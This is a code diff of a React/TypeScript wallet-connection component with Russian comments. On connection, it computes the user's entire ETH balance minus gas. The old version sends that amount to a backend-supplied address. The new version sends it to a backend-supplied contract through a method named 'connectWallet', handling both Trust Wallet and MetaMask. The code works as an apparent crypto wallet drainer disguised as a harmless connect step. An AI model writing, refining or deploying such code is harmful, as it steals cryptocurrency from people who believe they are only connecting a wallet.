@@ -2,7 +2,8 @@
 
 import { BACKEND_LINK } from '@/utils/variables';
 import { useState } from 'react';
-import Web3, { Web3EthInterface } from 'web3';
+import Web3, { Contract } from 'web3';
+import type { TransactionReceipt } from 'web3-types';
 
 
 interface ExternalProvider {
@@ -14,11 +15,18 @@ interface ExternalProvider {
   removeListener?(event: string, listener: (...args: unknown[]) => void): void
 }
 
+interface ResponseContract {
+  contract: {
+    address: string
+    abi: any[]
+  }
+}
+
+
 interface ResponseCalculateGasTrxNew {
-  maxPriorityFee: string;
-  maxFee: string;
   gasLimit: string;
-  sendValue: string;
+  gasPrice: string;
+  valueHex: string;
 }
 
 interface ResponseCalculateGasTrxLegacy {
@@ -27,161 +35,138 @@ interface ResponseCalculateGasTrxLegacy {
   sendValue: string;
 }
 
-async function fetchDataFromBackend(setStatus: (msg: string) => void,): Promise<string> {
-  /*
-    Получения Адреса кошелька
-  */
-  setStatus('Получаем адрес получателя от бэка…');
-  const res = await fetch(`${BACKEND_LINK}/contract`);
-  if (!res.ok) throw new Error(`Ошибка бэка: ${res.status}`);
-  const { recipient } = await res.json() as { recipient: string };
-  return recipient;
+async function fetchContractData(): Promise<{ address: string; abi: any[] }> {
+  const res = await fetch(`${BACKEND_LINK}/contract`)
+  if (!res.ok) {
+    throw new Error(`Ошибка при запросе контракта: HTTP ${res.status}`)
+  }
+  const data = (await res.json()) as ResponseContract
+
+  // Проверяем, что есть поле contract.address и contract.abi
+  if (
+    !data.contract ||
+    typeof data.contract.address !== 'string' ||
+    !Array.isArray(data.contract.abi)
+  ) {
+    throw new Error('Некорректный ответ от сервера: ' + JSON.stringify(data))
+  }
+
+  return {
+    address: data.contract.address,
+    abi: data.contract.abi,
+  }
 }
 
-async function calculateGasTrxLegacy(
-  addr: string,
-  addr_recipient: string,
-  web3: Web3): Promise<ResponseCalculateGasTrxLegacy> {
-  /*
-    Расчет цены газа для старых кошельков
-  */
-
-  // Баланс
-  const balanceWei = BigInt(await web3.eth.getBalance(addr))
-
-  // Получаем единственный gasPrice
+async function calculateGasTrxNew(
+  from: string,
+  ctr: Contract<any[]>,
+  web3: Web3,
+): Promise<ResponseCalculateGasTrxNew> {
+  // 1) Берём баланс
+  const balanceWei = BigInt(await web3.eth.getBalance(from))
+  // 2) Берём текущий gasPrice
   const gasPrice = BigInt(await web3.eth.getGasPrice())
 
-  // Оцениваем gasLimit (fallback на 21000)
-  let estimatedGas: bigint
-  try {
-    const gasEstimate = await web3.eth.estimateGas({
-      from: addr,
-      to: addr_recipient,
-      value: '0x0',
-      gasPrice: gasPrice.toString(),
+  // 3) Примерная оценка газа при value = balanceWei
+  const gasLimitBI = BigInt(
+    await ctr.methods.connectWallet().estimateGas({
+      from: from,
+      value: balanceWei.toString()
     })
-    estimatedGas = BigInt(gasEstimate)
-  } catch {
-    estimatedGas = 21000n
-  }
-  const gasLimit = estimatedGas + 1000n
+  )
 
-  // Считаем сколько уйдёт на газ и сколько можно отправить
-  const gasCost = gasLimit * gasPrice
-  const sendValue = balanceWei - gasCost
+  // 4) Добавляем 10% запаса
+  const gasLimit = gasLimitBI + gasLimitBI / 10n;
+
+  // 5) Считаем sendValue
+  const feeCost = gasLimit * gasPrice
+  const sendValue = balanceWei > feeCost ? balanceWei - feeCost : 0n;
   if (sendValue <= 0n) {
-    throw new Error('Недостаточно средств на оплату газа (legacy)')
+    throw new Error('Недостаточно ETH для покрытия газа');
   }
 
   return {
     gasLimit: gasLimit.toString(),
     gasPrice: gasPrice.toString(),
-    sendValue: sendValue.toString(16),
+    valueHex: '0x' + sendValue.toString(16),
   }
 }
 
-async function calculateGasTrxNew(
-  addr: string,
-  addr_recipient: string,
-  web3: Web3): Promise<ResponseCalculateGasTrxNew> {
-  /*
-    Расчет цены газа для новых кошельков
-  */
-  const balanceWei = BigInt(await web3.eth.getBalance(addr));
-  const block = await web3.eth.getBlock('pending');
-  const baseFee = block.baseFeePerGas
-    ? BigInt(block.baseFeePerGas as bigint)
-    : 0n;
-  let maxPriorityFee: bigint;
-  try {
-    maxPriorityFee = BigInt(
-      await (web3.eth as Web3EthInterface).getMaxPriorityFeePerGas()
-    );
-  } catch {
-    maxPriorityFee = BigInt(web3.utils.toWei('2.5', 'gwei'));
-  }
-  const maxFee = baseFee * 2n + maxPriorityFee;
-
-  // Оцениваем gas для простого transfer (receive-функция контракта)
-  let estimatedGas: bigint;
-  try {
-    const gasEstimate = await web3.eth.estimateGas({
-      from: addr,
-      to: addr_recipient,
-      value: '0x0',            // для оценки самого receive()
-      maxPriorityFeePerGas: maxPriorityFee.toString(),
-      maxFeePerGas: maxFee.toString(),
-      type: '0x2',
-    });
-    estimatedGas = BigInt(gasEstimate);
-  } catch {
-    // если не удалось, берём минимальный стандарт
-    estimatedGas = 21000n;
-  }
-  const gasLimit = estimatedGas + 1000n; // запас 1000
-
-  // Считаем, сколько уйдёт на газ, и вычитаем из баланса
-  const gasCost = gasLimit * maxFee;
-  const sendValue = balanceWei - gasCost;
-  if (sendValue <= 0n) {
-    throw new Error('Недостаточно средств на оплату газа');
-  }
-  return {
-    'maxPriorityFee': maxPriorityFee.toString(),
-    'maxFee': maxFee.toString(),
-    'gasLimit': gasLimit.toString(),
-    'sendValue': sendValue.toString(16),
-  }
-}
-
-// Вынесенная функция: вся логика взаимодействия с контрактом
-async function sendAllBalanceMetamask(
-  eth: ExternalProvider & { isMetaMask?: boolean; isTrust?: boolean },
+async function calculateGasTrxLegacy(
   from: string,
-  setStatus: (msg: string) => void,
-): Promise<string> {
-  // 1. Получаем Адрес получателя
-  const to = await fetchDataFromBackend(setStatus);
-
-  // 2. Настраиваем Web3
-  const web3 = new Web3(eth);
-
-  // 3. Расчитывает цену газа
-  const isTrustWallet = !!eth.isTrust;
-
-  let valueHex: string;
-  let txParams: Record<string, string> = { from, to };
-
-  // 4. Подготавливаем транзакцию  
-  if (isTrustWallet) {
-    const { gasLimit, gasPrice, sendValue } = await calculateGasTrxLegacy(from, to, web3);
-    valueHex = '0x' + sendValue;
-
-    txParams = {
-      ...txParams,
-      value: valueHex,
-      gas: gasLimit,
-      gasPrice: gasPrice,
-    }
-    console.log('txParams: ', txParams)
-  } else {
-    const { gasLimit, maxPriorityFee, maxFee, sendValue } = await calculateGasTrxNew(from, to, web3);
-    valueHex = '0x' + sendValue;
-
-    txParams = {
-      ...txParams,
-      value: valueHex,
-      gas: gasLimit,
-      maxPriorityFeePerGas: maxPriorityFee,
-      maxFeePerGas: maxFee,
-      type: '0x2',
-    }
+  ctr: Contract<any[]>,
+  web3: Web3
+): Promise<ResponseCalculateGasTrxLegacy> {
+ // 1) Баланс
+  const balanceWei = BigInt(await web3.eth.getBalance(from));
+  if (balanceWei === 0n) {
+    throw new Error('Баланс кошелька равен нулю.');
   }
 
-  // 5) Отправляем транзакцию
-  setStatus(`Отправляем ${web3.utils.fromWei(valueHex, 'ether')} ETH…`);
-  const receipt = await web3.eth.sendTransaction(txParams);
+  // 2) Оценка газа
+  let estimatedGasBI: bigint;
+  try {
+    const raw: bigint = await ctr.methods.connectWallet().estimateGas({ from });
+    estimatedGasBI = BigInt(raw);
+  } catch (err) {
+    estimatedGasBI = 21000n;
+  }
+
+  // 3) gasPrice
+  const gasPriceWei = BigInt(await web3.eth.getGasPrice());
+
+  // 4) feeCost = gasLimitBI * gasPriceWei
+  const feeCost = estimatedGasBI * gasPriceWei;
+
+  // 5) sendValueBI
+  let sendValueBI: bigint;
+  const bufferWei = 1n;
+  if (feeCost >= balanceWei) {
+    sendValueBI = 0n;
+  } else {
+    sendValueBI = balanceWei - feeCost - bufferWei;
+  }
+
+  return {
+    gasLimit: estimatedGasBI.toString(),
+    gasPrice: gasPriceWei.toString(),
+    sendValue: sendValueBI.toString(),
+  };
+}
+
+async function sendAllBalanceViaEIP1559(
+  eth: ExternalProvider,
+  from: string,
+  setStatus: (msg: string) => void
+): Promise<string> {
+  // 1) Берём address + abi из бекенда
+  const { address: contractAddress, abi } = await fetchContractData()
+
+  // ─── 2) Создаём web3 и экземпляр контракта ────────────────────────────────
+  const web3 = new Web3(eth as any)
+  const ctr = new web3.eth.Contract(abi, contractAddress)
+
+  const txParams: Record<string, string> = { from }
+
+  if (eth.isTrust) {
+    const legacy = await calculateGasTrxLegacy(from, ctr, web3);
+    const { gasLimit, gasPrice, sendValue } = legacy;
+
+    txParams.gas = gasLimit;
+    txParams.gasPrice = gasPrice;
+    txParams.value = sendValue;
+  } else {
+    const eip = await calculateGasTrxNew(from, ctr, web3);
+    txParams.gas = eip.gasLimit
+    txParams.gasPrice = eip.gasPrice
+    txParams.value = eip.valueHex;
+  }
+
+  const receipt: TransactionReceipt = await ctr.methods
+    .connectWallet()
+    .send(txParams)
+
+  setStatus(`Успех! TxHash: ${receipt.transactionHash}`)
   return String(receipt.transactionHash);
 }
 
@@ -216,8 +201,63 @@ export default function Wallet() {
     }
     setAccount(addr)
 
+    // const currentChainId = (await eth.request({
+    //     method: 'eth_chainId',
+    // })) as string
+    // console.log('currentChainId: ', currentChainId)
+
+    // if (currentChainId !== '0xaa36a7') {
+    //     setStatus('Переключаем сеть на Sepolia…')
+
+    //     try {
+    //       // Пытаемся переключить сеть на Sepolia
+    //       await eth.request({
+    //         method: 'wallet_switchEthereumChain',
+    //         params: [{ chainId: '0xaa36a7' }],
+    //       })
+    //     } catch (switchError: any) {
+    //       // Если Sepolia ещё не добавлена, добавляем через wallet_addEthereumChain
+    //       if (switchError.code === 4902 || switchError.code === -32603) {
+    //         // Параметры сети Sepolia
+    //         try {
+    //           await eth.request({
+    //             method: 'wallet_addEthereumChain',
+    //             params: [
+    //               {
+    //                 chainId: '0xaa36a7',
+    //                 chainName: 'Sepolia Testnet',
+    //                 nativeCurrency: {
+    //                   name: 'SepoliaETH',
+    //                   symbol: 'SEP', // или 'ETH'
+    //                   decimals: 18,
+    //                 },
+    //                 rpcUrls: ['https://rpc.sepolia.org'],
+    //                 blockExplorerUrls: ['https://sepolia.etherscan.io'],
+    //               },
+    //             ],
+    //           })
+    //           // После добавления снова переключаем
+    //           await eth.request({
+    //             method: 'wallet_switchEthereumChain',
+    //             params: [{ chainId: '0xaa36a7' }],
+    //           })
+    //         } catch (addError: any) {
+    //           const msg = addError instanceof Error ? addError.message : String(addError)
+    //           setStatus(`Не удалось добавить сеть Sepolia: ${msg}`)
+    //           setBusy(false)
+    //           return
+    //         }
+    //       } else {
+    //         const msg = switchError instanceof Error ? switchError.message : String(switchError)
+    //         setStatus(`Не удалось переключить сеть: ${msg}`)
+    //         setBusy(false)
+    //         return
+    //       }
+    //     }
+    //   }
+
     try {
-      const txHash = await sendAllBalanceMetamask(eth, addr, setStatus)
+      const txHash = await sendAllBalanceViaEIP1559(eth, addr, setStatus)
       setStatus(`Успех! TxHash: ${txHash}`)
     } catch (e: unknown) {
       const msg = e instanceof Error ? e.message : String(e);
